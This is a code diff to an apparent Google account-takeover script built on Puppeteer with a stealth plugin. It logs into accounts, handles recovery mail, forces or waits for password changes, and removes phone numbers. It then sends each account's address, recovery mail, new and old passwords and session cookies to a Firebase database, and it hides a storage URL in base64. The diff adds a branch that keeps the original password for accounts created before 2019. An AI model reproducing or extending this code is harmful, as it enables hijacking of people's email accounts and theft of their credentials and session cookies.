@@ -134,7 +134,6 @@ let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi
 
 puppeteer.use(StealthPlugin())
 
-
 startServer()
 
 
@@ -286,7 +285,13 @@ async function loginWithCompleted(number, password, cookies) {
     
                     console.log('Node: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
     
-                    if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
+                    if (!mPassword) {
+                        if (mYear < 2019 || mMailYear < 2019) {
+                            mPassword = password
+                        } else {
+                            mPassword = await waitForPasswordChange(page, mRapt)
+                        }
+                    }
     
                     try {
                         await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
@@ -433,7 +438,7 @@ async function waitForNumberRemove(page, mRapt) {
                         await delay(1000)
                     }
                 }
-                
+
                 for (let i = 0; i < 2; i++) {
                     let button = await page.$$('div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc kHssdc HvOprf FsOtSd M9Bg4d"]')
                     if (button && button.length == 2) {
